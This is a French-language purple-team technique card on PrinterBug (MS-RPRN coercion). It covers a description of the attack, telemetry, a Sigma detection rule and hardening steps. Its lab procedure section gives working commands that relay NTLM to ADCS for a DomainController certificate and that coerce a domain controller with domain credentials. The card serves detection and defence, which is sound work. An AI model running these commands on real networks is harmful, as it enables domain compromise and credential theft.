# 42 — PrinterBug / SpoolSample (MS-RPRN Coercion)

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Privilege Escalation / Credential Access |
| **Technique MITRE** | T1187 (Forced Authentication) |
| **Phase kill chain** | Credential Access / Lateral Movement |
| **CVE** | Abus de fonctionnalité MS-RPRN |
| **Privilèges requis** | Un compte de domaine authentifié |
| **Impact** | Élevé à Critique (coercition → relais → DA) |

---

## 1. Description

Le **PrinterBug** abuse le protocole d'impression **MS-RPRN** (fonction `RpcRemoteFindFirstPrinterChangeNotification`). Tout compte de domaine peut demander à un serveur (souvent un **DC**, où le spouleur d'impression tourne par défaut) de le **notifier des changements d'impression** — ce qui **force ce serveur à s'authentifier** vers une machine arbitraire. C'est un **cousin de PetitPotam** (fiche 24) : une **coercition** qui alimente un **NTLM Relay** vers ADCS (ESC8) ou LDAP (RBCD) → compromission du domaine.

## 2. Prérequis
- Un compte de domaine valide.
- Service **Spooler** actif sur la cible (souvent le cas par défaut sur les DC).
- Une cible de relais (ADCS HTTP, LDAP sans signing).

## 3. Procédure de simulation (lab)

```bash
# 1. Démarrer le relais (ex. vers ADCS ESC8)
ntlmrelayx.py -t http://adcs.datacorp.local/certsrv/certfnsh.asp --adcs --template DomainController

# 2. Forcer le DC à s'authentifier vers l'attaquant via le Spooler
printerbug.py datacorp.local/othmane:Marketing2025@10.0.0.10 10.0.0.50
# (SpoolSample.exe côté Windows)
```

## 4. Télémétrie générée (logs)

| Source | Event ID | Signification |
|--------|----------|---------------|
| Security (cible attaquant) | 4624 | Compte machine du DC authentifié vers l'attaquant |
| Security (DC) | 5145 | Accès au pipe `\PIPE\spoolss` |
| NDR / Zeek | DCE-RPC | Appel `RpcRemoteFindFirstPrinterChangeNotification` |

**Anomalie clé :** appel MS-RPRN vers un DC + compte machine du DC s'authentifiant vers un hôte quelconque.

## 5. Détection

### Règle Sigma (NDR / Zeek)
```yaml
title: PrinterBug - MS-RPRN Coercion via Spooler
status: experimental
logsource:
    product: zeek
    service: dce_rpc
detection:
    selection:
        operation: 'RpcRemoteFindFirstPrinterChangeNotification'
    condition: selection
level: high
```

### Traduction SIEM / NDR
- **NDR (Dataprotect) :** signature d'appel MS-RPRN vers un DC.
- **Elastic :** 5145 sur `\PIPE\spoolss` + logon du compte machine DC depuis une IP inattendue.

## 6. Contre-mesures / Hardening
- **Désactiver le service Spooler** sur les DC et serveurs qui n'impriment pas.
- **EPA + désactiver HTTP** sur ADCS (bloque ESC8) ; LDAP signing.
- Filtrer l'accès RPC entrant sur les DC.

## 7. Features pour l'agent IA
- Appel MS-RPRN (`spoolss`) vers un DC (feature réseau).
- Compte machine DC authentifié vers un hôte inhabituel.
- Séquence coercion → relais → émission de certificat / RBCD.

## 8. Références
- https://attack.mitre.org/techniques/T1187/
- https://github.com/leechristensen/SpoolSample
